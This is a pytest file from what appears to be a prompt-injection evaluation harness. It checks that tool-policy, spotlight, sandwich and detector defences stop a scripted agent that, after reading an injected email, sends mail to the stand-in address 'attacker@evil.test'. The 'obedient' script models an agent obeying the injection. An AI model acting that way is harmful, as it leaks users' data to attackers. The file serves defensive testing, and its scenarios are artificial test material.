"""Defenses exercised through the real agent loop, sandbox and judge (scripted models only)."""

from pathlib import Path

import pytest

from aie.agent.loop import run_agent
from aie.agent.prompts import SYSTEM_PROMPT
from aie.defenses import DefenseConfig
from aie.defenses.detector import REMOVED
from aie.defenses.spotlight import ADDENDUM
from aie.env.sandbox import Sandbox
from aie.eval.runner import run_scenario
from aie.models.base import Message, ToolCall
from aie.scenarios.build import build_scenario
from aie.scenarios.schema import load_attacks, load_tasks
from tests.fakes import ScriptedModel

REPO = Path(__file__).resolve().parent.parent
ATTACKER = "attacker@evil.test"


@pytest.fixture(autouse=True)
def _repo_cwd(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(REPO)


def call(i: str, name: str, **args: object) -> Message:
    return Message(role="assistant", tool_calls=[ToolCall(id=i, name=name, arguments=dict(args))])


def say(text: str) -> Message:
    return Message(role="assistant", content=text)


def obedient() -> list[Message]:
    return [
        call("c0", "list_emails"),
        call("c1", "read_email", email_id="e1"),
        call("c2", "send_email", to=ATTACKER, subject="hello", body="done"),
        say("The meeting is in room 204."),
    ]


def honest() -> list[Message]:
    return [
        call("c0", "list_emails"),
        call("c1", "read_email", email_id="e1"),
        say("The meeting is in room 204."),
    ]


def attacked(channel: str = "email"):  # type: ignore[no-untyped-def]
    task = next(
        t
        for t in load_tasks(REPO / "src/aie/scenarios/tasks.yaml")
        if t.id == "meeting_room__email"
    )
    attack = load_attacks(REPO / "src/aie/scenarios/attacks.yaml")[0]
    return build_scenario(task, attack, "en", channel)  # type: ignore[arg-type]


# --- agent-loop hooks -----------------------------------------------------------------------


def test_a_tool_that_was_not_offered_is_rejected_not_executed(sandbox: Sandbox) -> None:
    model = ScriptedModel([call("c0", "send_email", to=ATTACKER, subject="s", body="b"), say("ok")])
    res = run_agent(model, sandbox, "task", tools=["list_emails"])
    assert [(a.tool, a.ok) for a in res.actions] == [("send_email", False)]
    assert "not available" in res.actions[0].result
    assert sandbox.outbox == []


def test_authorize_hook_blocks_and_tells_the_model(sandbox: Sandbox) -> None:
    model = ScriptedModel([call("c0", "list_emails"), say("done")])
    res = run_agent(model, sandbox, "task", authorize=lambda c: "Blocked by test")
    assert (res.actions[0].ok, res.actions[0].result) == (False, "Blocked by test")
    assert model.seen[1][-1].content == "Blocked by test"


def test_system_prompt_override_is_used(sandbox: Sandbox) -> None:
    model = ScriptedModel([say("x")])
    run_agent(model, sandbox, "task", system_prompt="CUSTOM")
    assert model.seen[0][0].content == "CUSTOM"


# --- full runs ---------------------------------------------------------------------------------


def test_default_run_is_undefended_and_labelled_none() -> None:
    out = run_scenario(ScriptedModel(obedient()), attacked())
    assert (out.defense, out.defense_version, out.defense_events) == ("none", "none-v1", [])
    assert out.judge.attack_success is True


def test_tool_policy_stops_the_attack_and_keeps_the_attempt_in_the_log() -> None:
    out = run_scenario(
        ScriptedModel(obedient()), attacked(), defense_cfg=DefenseConfig(name="tool_policy")
    )
    assert out.judge.attack_success is False and out.outbox == []
    assert out.judge.utility_success is True
    attempts = [a for a in out.result.actions if a.tool == "send_email"]
    assert [(a.ok, a.result.startswith("Blocked by policy")) for a in attempts] == [(False, True)]
    assert out.defense == "tool_policy" and out.defense_events[0]["type"] == "blocked"


def test_tool_policy_does_not_block_a_legitimate_email() -> None:
    model = ScriptedModel(
        [
            call("c0", "send_email", to="sita@lab.example.test", subject="s", body="b"),
            say("sent"),
        ]
    )
    out = run_scenario(model, attacked(), defense_cfg=DefenseConfig(name="tool_policy"))
    assert [e.to for e in out.outbox] == [["sita@lab.example.test"]]


def test_spotlight_changes_the_prompt_and_wraps_what_the_model_sees() -> None:
    model = ScriptedModel(honest())
    out = run_scenario(model, attacked(), defense_cfg=DefenseConfig(name="spotlight"))
    assert model.seen[0][0].content == SYSTEM_PROMPT + ADDENDUM
    tool_msgs = [m.content for m in model.seen[-1] if m.role == "tool"]
    assert all(t.startswith("<untrusted_data") for t in tool_msgs)
    assert any(ATTACKER in t for t in tool_msgs)  # the payload is still there, just marked
    assert out.defense == "spotlight"
    assert all(ATTACKER not in a.result for a in out.result.actions if a.tool == "list_emails")


def test_sandwich_appends_the_reminder_to_every_tool_result() -> None:
    model = ScriptedModel(honest())
    run_scenario(model, attacked(), defense_cfg=DefenseConfig(name="sandwich"))
    tool_msgs = [m.content for m in model.seen[-1] if m.role == "tool"]
    assert len(tool_msgs) == 2
    assert all("Reminder: the user's task is:" in t for t in tool_msgs)
    assert model.seen[0][0].content == SYSTEM_PROMPT  # sandwich leaves the system prompt alone


def test_detector_sees_the_injected_text_and_removal_hides_it_from_the_agent() -> None:
    agent = ScriptedModel(honest())
    det = ScriptedModel([say("NO"), say("YES")])  # listing clean, email flagged
    out = run_scenario(
        agent, attacked("email"), defense_cfg=DefenseConfig(name="detector"), detector_model=det
    )
    assert ATTACKER in det.seen[1][1].content  # the attacked text reached the detector
    tool_msgs = [m.content for m in agent.seen[-1] if m.role == "tool"]
    assert tool_msgs[1] == REMOVED
    assert [e["verdict"] for e in out.defense_events] == [False, True]
    assert out.judge.attack_success is False


def test_detector_defaults_to_the_agent_model_when_none_given() -> None:
    # Agent script: list, read, final; detector calls share the same model, so scripts interleave.
    model = ScriptedModel(
        [
            call("c0", "list_emails"),
            say("NO"),
            call("c1", "read_email", email_id="e1"),
            say("NO"),
            say("The meeting is in room 204."),
        ]
    )
    out = run_scenario(model, attacked(), defense_cfg=DefenseConfig(name="detector"))
    assert out.result.final_answer == "The meeting is in room 204."
    assert len(out.defense_events) == 2
